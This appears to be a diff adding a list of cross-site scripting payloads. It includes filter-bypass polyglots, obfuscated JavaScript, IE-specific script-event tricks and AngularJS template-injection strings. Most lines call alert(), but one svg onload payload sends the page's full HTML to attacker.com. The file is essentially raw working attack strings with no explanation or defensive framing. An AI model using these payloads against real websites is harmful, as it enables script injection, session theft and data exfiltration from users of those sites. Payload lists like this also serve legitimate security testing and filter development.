@@ -1,0 +1,21 @@
+<div id="d"><option id="o"></div><script>d.addEventListener("DOMNodeRemoved",function(){new ArrayBuffer(0xfffffff);alert()});document.createElement("select").options[0]=o;</script>
+<noembed><img src="</noembed><iframe onload=alert(1)>" /></noembed>
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+<html><head><meta http-equiv="x-ua-compatible" content="IE=5"></head><body><iframe onload="JScript.Compact:alert(1)"></iframe><iframe onload="JScript.Compact:alert(2);"></iframe></body></html>
+<a href=# name=x id=x>Click me on IE11</a><script event="onclick(blah)<wtfbbq>{}" for=x>blah.view.alert(1)</script>
+<script event=onload for=window>return alert(2)};{ //IE11 only</script>
+<svg/onload="(new Image()).src='//attacker.com/'%2Bdocument.documentElement.innerHTML">
+javascript:"/*'/*`/*--><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
+javascript://comment%0a%0dalert(0);
+<script>([,하,,,,훌]=[]+{},[한,글,페,이,,로,드,ㅋ,,,ㅎ]=[!!하]+!하+하.ㅁ)[훌+=하+ㅎ+ㅋ+한+글+페+훌+한+하+글][훌](로+드+이+글+한+'(45)')()</script>
+<d3"<"/onclick="1>[confirm``]"<">z
+(_=>`${`${_}`[!![]<<!![]<<!![]]} ${`${_}`[~~![]]} ${`${_}`[~~!![]]}`)()
+onload=\"a='aler';d='XSS';b='t('+d+')';c=a+b;console.log(eval(c));
+%0ajavascript:`/*\"/*-->&lt;svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover="/**/ alert()//'">`
+{{$eval.constructor('alert(1)')()}}
+{{$on.constructor('alert(1)')()}}
+<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
+<object/onerror=write`1`//
+<form id=frm><object id=x form=frm></object></form><script>alert(document.getElementById('x').form);</script>
+<legend id=x form=frm></legend>
+<output name="jAvAsCriPt://&NewLine;\u0061ler&#116(1)" onclick="eval(name)">X</output>
